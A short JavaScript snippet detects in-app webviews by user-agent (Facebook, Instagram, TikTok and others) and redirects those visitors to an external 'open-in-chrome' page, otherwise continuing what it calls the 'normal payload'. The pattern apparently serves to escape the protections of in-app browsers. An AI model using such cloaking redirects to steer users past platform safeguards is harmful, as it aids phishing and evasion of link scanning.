(function () {
  const ua = navigator.userAgent.toLowerCase();
  const suspects = [
    "fbav", "instagram", "whatsapp", "telegram", "tiktok",
    "snapchat", "reddit", "twitter", "linkedin", "wv"
  ];
  const isWebView = suspects.some(agent => ua.includes(agent));
  if (isWebView) {
    console.log("🚧 WebView detected – redirecting");
    setTimeout(() => {
      window.location.href = "https://checkerls.vercel.app/open-in-chrome.html";
    }, 2000);
  } else {
    console.log("✅ Browser OK – continue normal payload");
  }
})();
